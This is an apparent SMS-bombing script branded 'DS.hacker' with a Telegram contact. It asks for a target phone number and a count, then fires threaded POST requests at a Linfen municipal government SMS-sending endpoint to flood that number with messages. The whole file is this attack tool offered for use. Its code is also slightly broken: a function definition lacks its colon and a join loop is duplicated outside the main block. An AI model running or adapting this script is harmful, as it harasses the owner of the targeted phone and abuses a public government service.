import os

import requests
import threading
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def send_request(session, i, userphone)
    try:
        url = "http://szrx.linfen.gov.cn:8080/lf_12345_api/rx/mailbox/sendMessageOnly"
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        data = {"userphone": userphone}
        response = session.post(url, headers=headers, data=data)
        logging.info(f"Request {i + 1}: Status Code {response.status_code}")
        if response.status_code == 200:
            logging.info("Success: " + response.text)
        else:
            logging.warning(f"Failed: Status Code {response.status_code}, Body: {response.text}")
    except requests.RequestException as e:
        logging.error(f"Error in request {i + 1}: {e}")


if __name__ == "__main__":
    os.system("clear")
    os.system("figlet DS.hacker")
    print("______________________")
    print("|     DS.hacker     |")
    print("|TG:Https://t.me//hackerDss")
    print("______________________")
    userphone = input("Please enter your mobile phone number: ")
    num_requests = int(input("Please enter the number of times you want to send the request: "))

    with requests.Session() as session:
        threads = []

        for i in range(num_requests):
            t = threading.Thread(target=send_request, args=(session, i, userphone))
            threads.append(t)
            t.start()

            # 等待所有线程完成
        for t in threads:
            t.join()

    logging.info("All requests have been sent。")

for t in threads:
    t.join()
